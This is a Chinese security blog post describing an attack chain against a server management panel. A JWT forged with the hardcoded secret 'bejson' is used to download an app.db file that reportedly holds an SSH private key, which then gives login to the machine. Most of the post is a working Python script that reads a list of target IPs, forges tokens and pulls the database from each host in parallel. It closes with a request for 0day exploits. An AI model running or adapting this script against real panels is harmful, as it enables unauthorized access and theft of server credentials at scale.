> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk2NDkyMjUxMA==&mid=2247483689&idx=1&sn=0aa653b5743553d1825b5947385aed22

#  一个面板的RCE方式  
原创 SusuisGreat  苏苏努力学网安   2025-07-14 06:51  
  
已经被爆出来了，我把我的也发出来大家一起来看看吧，其他文章已有分析我就不说了。  
  
改JWT的数据 -》 去下载接口获取一个 app.db的数据库文件 -》 数据库文件会有私钥（咱也不知道为什么会有） -》   
用私钥直接登录机器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2ul73SxavQ6cUYYibr0260psuFmdGBx9sPlDeLaCh47wWV9gkmBB9eMGF3PDNT23kg3AyUzGSGY7mn4fjiczwNoA/640?wx_fmt=png&from=appmsg "")  
  
  
不太能用代码：  

```
import requests
import argparse
import jwt
import time
from concurrent.futures import ThreadPoolExecutor
def get_config_data(ip):
    url = f&#34;http://{ip}/panelCfg/sectionCfgs?section=panel&#34;
    headers = {
        &#34;Connection&#34;: &#34;keep-alive&#34;,
        &#34;sec-ch-ua-platform&#34;: &#34;Windows&#34;,
        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#34;,
        &#34;Accept&#34;: &#34;application/json, text/plain, */*&#34;,
        &#34;sec-ch-ua&#34;: &#34;Google Chrome;v=135, Not-A.Brand;v=8, Chromium;v=135&#34;,
        &#34;sec-ch-ua-mobile&#34;: &#34;?0&#34;,
        &#34;Sec-Fetch-Site&#34;: &#34;same-origin&#34;,
        &#34;Sec-Fetch-Mode&#34;: &#34;cors&#34;,
        &#34;Sec-Fetch-Dest&#34;: &#34;empty&#34;,
        &#34;Accept-Encoding&#34;: &#34;gzip, deflate, br, zstd&#34;,
        &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        print(f&#34;请求失败，状态码: {response.status_code}&#34;)
        return None
def extract_account_and_iss(json_data):
    account = None
    iss = None
    if json_data and json_data.get('code') == 1000:
        for item in json_data.get('data', []):
            if item.get('key') == 'Account': 
                account = item.get('value')
            if item.get('key') == 'XPVersion': 
                iss = item.get('value')
    return account, iss
def construct_jwt(account, iss):
    current_time = int(time.time())
    
    payload = {
        'exp': current_time + 36000, 
        'iat': current_time,
        'iss': account,
        'account': account, 
        'nbf': current_time,  
        'temp': False,
        'user_id': 1
    }
    secret_key = 'bejson'
    headers = {
        'alg': 'HS256',
        'typ': 'JWT'
    }
    token = jwt.encode(payload, secret_key, algorithm='HS256', headers=headers)
    
    return token
def download_file(ip, token):
    url = f&#34;http://{ip}/file/download?&pathname=/xp/db/app.db&token={token}&#34;
    headers = {
        &#34;Connection&#34;: &#34;keep-alive&#34;,
        &#34;Sec-Fetch-Site&#34;: &#34;same-origin&#34;,
        &#34;Sec-Fetch-Mode&#34;: &#34;navigate&#34;,
        &#34;Sec-Fetch-Dest&#34;: &#34;empty&#34;,
        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#34;,
        &#34;Accept-Encoding&#34;: &#34;gzip, deflate, br, zstd&#34;,
        &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;
    }
    filename = ip.replace('.', '_') + '.db'
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print(f&#34;{ip} 文件下载成功&#34;)
        with open(filename, 'wb') as f:
            f.write(response.content)
        print(f&#34;{ip} 文件保存为 {filename}&#34;)
    else:
        print(f&#34;{ip} 下载失败，状态码: {response.status_code}&#34;)
def handle_ip(ip):
    print(f&#34;正在请求 IP 地址 {ip} ...&#34;)
    json_data = get_config_data(ip)
    account, iss = extract_account_and_iss(json_data)
    
    if account and iss:
        print(f&#34;提取的 Account: {account}&#34;)
        print(f&#34;提取的 XPVersion (作为 iss): {iss}&#34;)
        token = construct_jwt(account, iss)
        print(f&#34;构造的 JWT: {token}&#34;)
        download_file(ip, token)
    else:
        print(f&#34;{ip} 无法提取 Account 或 XPVersion&#34;)
def read_ips_from_file(file_path):
    try:
        with open(file_path, 'r') as f:
            ips = [line.strip() for line in f.readlines() if line.strip()]
        return ips
    except FileNotFoundError:
        print(f&#34;文件 {file_path} 未找到&#34;)
        return []
    except Exception as e:
        print(f&#34;读取文件时出错: {e}&#34;)
        return []
def main():
    parser = argparse.ArgumentParser(description=&#34;请求并获取配置数据，构造 JWT，并下载文件&#34;)
    parser.add_argument('-ips', type=str, help=&#34;目标 IP 地址文件路径&#34;)
    args = parser.parse_args()
    file_path = args.ips
    if not file_path:
        print(&#34;请提供 IP 地址文件路径&#34;)
        return
    ips = read_ips_from_file(file_path)
    if not ips:
        print(&#34;文件中没有有效的 IP 地址&#34;)
        return
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(handle_ip, ips)
if __name__ == '__main__':
    main()
```

  
  
  
好烦，又少了一个洞。希望有好心人给我发个0day。  
  
  
